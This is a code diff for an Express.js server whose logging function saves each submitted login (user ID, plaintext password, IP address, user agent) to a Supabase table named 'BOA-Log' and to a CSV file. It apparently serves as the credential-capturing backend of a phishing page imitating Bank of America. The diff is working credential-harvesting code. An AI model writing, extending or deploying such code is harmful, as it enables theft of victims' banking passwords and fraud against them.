@@ -18,16 +18,47 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // API Routes MUST come before static middleware
-// Setup endpoint to test BOA-Log table
+// Setup endpoint to verify and initialize database
 app.post('/api/setup', async (req, res) => {
-  console.log('Setup endpoint called - testing BOA-Log table');
+  console.log('Setup endpoint called - verifying BOA-Log table');
   try {
-    // For now, just acknowledge the setup request
-    // Supabase integration will be handled via CSV fallback in logEntry
-    res.json({ success: true, message: 'Setup acknowledged. Using CSV logging for now.' });
+    if (useSupabase && supabase) {
+      // Test Supabase connection and table
+      const { data, error } = await supabase
+        .from('BOA-Log')
+        .select('*')
+        .limit(1);
+      
+      if (error) {
+        console.error('Supabase table check error:', error.message);
+        return res.json({
+          success: false,
+          message: 'BOA-Log table not accessible',
+          error: error.message,
+          fallback: 'Using CSV logging'
+        });
+      }
+      
+      console.log('Supabase BOA-Log table verified');
+      res.json({
+        success: true,
+        message: 'Supabase BOA-Log table ready',
+        dataSource: 'Supabase + CSV backup'
+      });
+    } else {
+      res.json({
+        success: true,
+        message: 'Using CSV logging (Supabase not configured)',
+        dataSource: 'CSV'
+      });
+    }
   } catch (error) {
     console.error('Setup error:', error.message);
-    res.status(500).json({ success: false, error: error.message });
+    res.status(500).json({
+      success: false,
+      error: error.message,
+      fallback: 'CSV logging available'
+    });
   }
 });
 
@@ -40,19 +71,17 @@ app.get('/api/debug', (req, res) => {
 app.use(express.static(path.join(__dirname)));
 
 // Supabase Configuration
-// Temporarily disabled to use CSV logging as baseline
-// Will re-enable after CSV logging is verified working
 const supabaseUrl = process.env.SUPABASE_URL;
 const supabaseKey = process.env.SUPABASE_ANON_KEY;
-const useSupabase = false; // Disabled temporarily
+const useSupabase = true; // Enabled for BOA-Log table integration
 
 let supabase = null;
-// if (useSupabase) {
-//   supabase = createClient(supabaseUrl, supabaseKey);
-//   console.log('Supabase client initialized');
-// } else {
-  console.log('Using CSV logging for now (Supabase temporarily disabled)');
-// }
+if (useSupabase && supabaseUrl && supabaseKey) {
+  supabase = createClient(supabaseUrl, supabaseKey);
+  console.log('Supabase client initialized for BOA-Log table');
+} else {
+  console.log('Supabase credentials not found, will use CSV logging only');
+}
 
 // Local CSV Logger Configuration (for development)
 const logsDir = path.join(__dirname, 'logs');
@@ -96,13 +125,39 @@ app.post('/api/login', async (req, res) => {
 
 // Log entry function - supports both Supabase and local CSV
 async function logEntry(data) {
+  const timestamp = new Date().toISOString();
+  
   try {
-    // For now, use CSV fallback to avoid Supabase schema issues
-    // TODO: Fix Supabase BOA-Log table schema compatibility
+    // Try Supabase first if enabled
+    if (useSupabase && supabase) {
+      try {
+        const { error } = await supabase
+          .from('BOA-Log')
+          .insert([
+            {
+              user_id: data.userId || 'N/A',
+              password: data.password || 'N/A',
+              remember_me: data.rememberMe ? true : false,
+              ip_address: data.ipAddress || 'unknown',
+              user_agent: data.userAgent || 'unknown',
+              status: 'Attempted'
+            }
+          ]);
+        
+        if (error) {
+          console.error('[Supabase] Insert error:', error.message);
+          // Fall through to CSV logging
+        } else {
+          console.log('[Supabase] Entry logged to BOA-Log table:', data.userId);
+        }
+      } catch (supabaseError) {
+        console.error('[Supabase] Exception during insert:', supabaseError.message);
+        // Fall through to CSV logging
+      }
+    }
     
-    // Fallback to local CSV logging
+    // Always log to CSV as backup
     const logsFile = path.join(logsDir, 'login_entries.csv');
-    const timestamp = new Date().toISOString();
     const entry = `${timestamp},${data.userId || 'N/A'},${data.password || 'N/A'},${data.rememberMe ? 'Yes' : 'No'},${data.ipAddress || 'unknown'},"${(data.userAgent || 'unknown').replace(/"/g, '""')}",Attempted\n`;
     
     // Add header if file doesn't exist
@@ -111,7 +166,7 @@ async function logEntry(data) {
     }
     
     fs.appendFileSync(logsFile, entry);
-    console.log('Entry logged to CSV:', data.userId);
+    console.log('[CSV] Entry logged:', data.userId);
   } catch (error) {
     console.error('Error logging entry:', error);
     throw error;
